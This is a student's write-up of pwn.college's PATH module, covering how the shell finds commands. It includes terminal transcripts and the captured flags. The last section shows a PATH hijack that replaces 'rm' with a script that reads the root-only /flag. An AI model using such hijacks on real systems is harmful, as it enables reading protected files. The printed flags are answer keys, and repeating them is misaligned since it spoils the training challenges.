# PONDERING PATH MODULE 12
This module will ponder upon the inbuilt commands such as `ls` and how does the shell find these programs.

## 1. The PATH Variable
1. There is a special shell variable, called PATH, that stores a bunch of directory paths in which the shell will search for programs corresponding to commands.
2. If we blankout the PATH using `PATH=""` it wouldnt be able to find the inbuilt commands and programs related to its functioning.
   
   In this challenge, I used the `rm` command first then set `PATH=""`. Now the rm command cannot be found and I used `/challenge/run` to get the flag which would otherwise be removed
   ### Flag
   `pwn.college{4AjmAYI9XXC-vFmKEIyPRIREEKv.dZzNwUDL3kjM2czW}`

## 2. Setting PATH 
1. PATH stores a list of directories to find commands
2. But for non standard commands we have to typically execute them by specifying the entire path.

   Example:
   ```
   hacker@dojo:~$ ls /home/hacker/scripts
   goodscript	badscript	okayscript
   hacker@dojo:~$ goodscript
   bash: goodscript: command not found
   hacker@dojo:~$ /home/hacker/scripts/goodscript
   YEAH! This is the best script!
   ```
3. If we want to launch useful scripts using their bare name, we need to add or replace directories in the PATH list.
   Example:
   ```
   hacker@dojo:~$ PATH=/home/hacker/scripts
   hacker@dojo:~$ goodscript
   YEAH! This is the best script!
   ```

   In this challenge, we had to overwrite PATH by `PATH="/challenge/more_commands"` and then execute `/challenge/run` to get the flag

   ### Flag
   `pwn.college{w1crpoGmDrj9vZlA33AvElqiHGE.dVzNyUDL3kjM2czW}`

## 3. Adding Commands

Here we had to create a shell script called `win`. We had to display the contents of /flag inside `win` using cat, but the problem was that once the directory is specified to the PATH Variable it will overwrite the contents and not know what `cat /flag` does.\
To fix this issue, we needed the absolute path of cat which, after strugggling a lot, I found through `which cat`
Then I echoed the commands and the absolute path into `win` which was inside the `soln` directory in `/home/hacker`.

Commands used: 
```
 which cat
/run/workspace/bin/cat
hacker@path~adding-commands:~$ ls -l /run/workspace/bin/cat
lrwxrwxrwx 1 root root 17 Jan  1  1970 /run/workspace/bin/cat -> /run/dojo/bin/cat
hacker@path~adding-commands:~$ ls -l /run/dojo/bin/cat
lrwxrwxrwx 16 root root 65 Jan  1  1970 /run/dojo/bin/cat -> /nix/store/k71apxkm38m3g34k01sb6zhysi0y7gph-coreutils-9.5/bin/cat
hacker@path~adding-commands:~$ mkdir soln
hacker@path~adding-commands:~$ cd soln
hacker@path~adding-commands:~/soln$ echo /run/dojo/bin/cat > /home/hacker/soln/win
hacker@path~adding-commands:~/soln$ echo /run/dojo/bin/cat /flag > /home/hacker/soln/win
hacker@path~adding-commands:~/soln$ ls -l /run/dojo/bin/cat /flag
-r--------  1 root root 58 Oct 20 05:30 /flag
hacker@path~adding-commands:~/soln$ chmod a+x win
hacker@path~adding-commands:~/soln$ ls -l win
-rwxr-xr-x 1 hacker hacker 24 Oct 20 05:37 win
hacker@path~adding-commands:~/soln$ PATH="/home/hacker/soln"
hacker@path~adding-commands:~/soln$ /challenge/run
Invoking 'win'....
pwn.college{4TCaapwXvYQH3fkZAvfYIZogmlw.dZzNyUDL3kjM2czW}
```

### Flag
`pwn.college{4TCaapwXvYQH3fkZAvfYIZogmlw.dZzNyUDL3kjM2czW}`

## 4. Hijacking Commands

In this challenge, /challenge/run will remove the flag using rm\
but we can hijack this command by overriding this command with the cat command which will read the flag instead of removing the flag using rm i.e. rm will essentially cat the flag because we re[laced absolute path of rm with absolute path of cat.

```
hacker@path~hijacking-commands:~$ ls
COLLEGE  PATH  challenge     myflag        pwnop  soln   solutions  win.sh
Desktop  PWN   instructions  not-the-flag  rm     solns  the-flag
hacker@path~hijacking-commands:~$ cd solutions
hacker@path~hijacking-commands:~/solutions$ echo "/run/dojo/bin/cat /flag" > rm
hacker@path~hijacking-commands:~/solutions$ chmod a+x rm
hacker@path~hijacking-commands:~/solutions$ PATH="/home/hacker/solutions"
hacker@path~hijacking-commands:~/solutions$ /challenge/run
Trying to remove /flag...
pwn.college{cfo2C8NdtGbO191PjRHoU1Yb3G1.ddzNyUDL3kjM2czW}
hacker@path~hijacking-commands:~/solutions$
```
